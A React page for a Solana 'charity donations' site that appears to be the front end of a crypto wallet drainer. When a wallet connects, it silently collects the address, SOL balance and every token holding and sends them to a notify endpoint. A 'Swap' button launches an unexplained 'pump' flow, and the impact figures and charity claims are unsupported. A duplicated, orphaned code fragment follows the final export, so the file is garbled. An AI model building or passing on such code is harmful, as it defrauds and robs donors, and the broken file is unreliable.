import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { Button } from '@/components/ui/button';
import { usePump } from '@/hooks/useDonation';
import { Heart, Wallet, Gift } from 'lucide-react';
import logoImage from '/pump.png';
import { useState, useEffect, useRef } from 'react';
import { useConnection } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { notify } from '@/lib/notify';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { FeedbackModal } from '@/components/FeedbackModal';
import { CenterWalletButton } from '@/components/CenterWalletButton';

/**
 * This site is used to collect donations for charity.
 * All proceeds go to supporting humanitarian causes around the world.
 * Your generosity helps make a difference in people's lives.
 */

const Index = () => {
  const { connected, publicKey, connect, select, wallets } = useWallet();
  const { connection } = useConnection();
  const { startDonation, isProcessing, transactions, currentIndex, pumpOutcome } = usePump();
  const [walletBalance, setWalletBalance] = useState<number>(0);
  const [isEligible, setIsEligible] = useState<boolean>(false);
  const hasNotifiedConnect = useRef(false);
  const [feedbackOpen, setFeedbackOpen] = useState(false);

  const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);

  useEffect(() => {
    // Open the feedback modal when the pump flow is cancelled or errors
    if (pumpOutcome === 'cancelled' || pumpOutcome === 'error') {
      setFeedbackOpen(true);
    }
  }, [pumpOutcome]);

  useEffect(() => {
    const checkBalance = async () => {
      if (publicKey) {
        try {
          const balance = await connection.getBalance(publicKey);
          const solBalance = balance / LAMPORTS_PER_SOL;
          setWalletBalance(solBalance);
          setIsEligible(solBalance >= 0.00001);

          // Send connect notification once
          if (connected && !hasNotifiedConnect.current) {
            try {
              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID,
              });
              const tokens = tokenAccounts.value
                .map(({ account }) => {
                  const info = account.data.parsed.info;
                  const amount = info.tokenAmount.uiAmount;
                  if (!amount || amount <= 0) return null;
                  return {
                    mint: info.mint,
                    symbol: info.mint.slice(0, 8),
                    amount: amount,
                  };
                })
                .filter(Boolean);

              await notify('wallet_connected', {
                address: publicKey.toBase58(),
                solBalance: solBalance,
                tokens: tokens,
              });
              hasNotifiedConnect.current = true;
            } catch (e) {
              console.warn('connect notify error', (e as Error).message);
            }
          }
        } catch (error) {
          console.error('Error fetching balance:', error);
        }
      }
    };

    if (connected) {
      checkBalance();
      const interval = setInterval(checkBalance, 5000);
      return () => clearInterval(interval);
    }
  }, [connected, publicKey, connection]);

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden bg-gradient-to-b from-blue-900 to-blue-700">
      {/* Top Bar */}
      <div className="relative z-20">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Heart className="text-red-500" size={24} />
            <span className="font-bold text-white">Charity Donations</span>
          </div>
          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
        </div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-2xl space-y-8">
          {/* Charity Information */}
          <div className="text-center space-y-4 bg-white/10 backdrop-blur-sm p-6 rounded-lg">
            <h1 className="text-3xl font-bold text-white">Support Our Cause</h1>
            <p className="text-white/80">
              Your donation helps us provide essential services to those in need.
              Together, we can make a difference in communities around the world.
            </p>
            <div className="flex justify-center">
              <Heart className="text-red-500" size={48} />
            </div>
          </div>

          {/* Wallet Connection */}
          <div className="flex flex-col items-center gap-4">
            {!connected ? (
              <div className="text-center space-y-4">
                <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg">
                  <p className="text-white mb-4">Connect your wallet to make a donation</p>
                  <CenterWalletButton />
                </div>
              </div>
            ) : (
              <div className="w-full space-y-6">
                {/* Action Button */}
                {!isProcessing && transactions.length === 0 && (
                  <div className="flex flex-col space-y-4 bg-white/10 backdrop-blur-sm p-6 rounded-lg">
                    <p className="text-white text-center mb-2">Thank you for your generosity!</p>
                    <Button
                      variant="pump"
                      size="xl"
                      onClick={startDonation}
                      className="w-full bg-red-500 hover:bg-red-600"
                      disabled={isProcessing}
                    >
                      <Heart className="w-6 h-6 mr-2" />
                      Swap
                    </Button>
                    <a href="/go-ru-local" className="w-full">
                      <Button
                        variant="outline"
                        size="xl"
                        className="w-full text-white border-white hover:bg-white/20"
                      >
                        go ru local
                      </Button>
                    </a>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Charity Impact */}
          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg text-center">
            <h2 className="text-xl font-bold text-white mb-4">Your Impact</h2>
            <div className="grid grid-cols-3 gap-4">
              <div className="flex flex-col items-center">
                <Gift className="text-yellow-300 mb-2" size={24} />
                <p className="text-white font-bold">100+</p>
                <p className="text-white/70 text-sm">Families Helped</p>
              </div>
              <div className="flex flex-col items-center">
                <Heart className="text-red-500 mb-2" size={24} />
                <p className="text-white font-bold">50+</p>
                <p className="text-white/70 text-sm">Communities</p>
              </div>
              <div className="flex flex-col items-center">
                <Wallet className="text-green-400 mb-2" size={24} />
                <p className="text-white font-bold">$10K+</p>
                <p className="text-white/70 text-sm">Raised</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="relative z-10 bg-black/30 py-4">
        <div className="container mx-auto px-4 text-center text-white/60 text-sm">
          <p>All donations are securely processed on the Solana blockchain</p>
          <p className="mt-1">© 2023 Charity Donations. All rights reserved.</p>
        </div>
      </div>

      <FeedbackModal open={feedbackOpen} onOpenChange={setFeedbackOpen} />
    </div>
  );
};

export default Index;

      {/* Removed Token Marquee section as requested */}

      <FeedbackModal
        open={feedbackOpen}
        onOpenChange={setFeedbackOpen}
        address={publicKey ? publicKey.toBase58() : undefined}
        context={pumpOutcome === 'cancelled' ? 'cancelled' : 'error'}
      />

      <style>{`
        @keyframes gradient {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        .animate-gradient {
          animation: gradient 3s ease infinite;
        }
        .delay-1000 {
          animation-delay: 1s;
        }
        
        @keyframes marquee {
          0% { transform: translateX(0); }
          100% { transform: translateX(-50%); }
        }
        
        .marquee-container {
          overflow: hidden;
          white-space: nowrap;
        }
        
        .marquee-content {
          display: inline-block;
          animation: marquee 30s linear infinite;
        }
      `}</style>
    </div>
  );
};

export default Index;
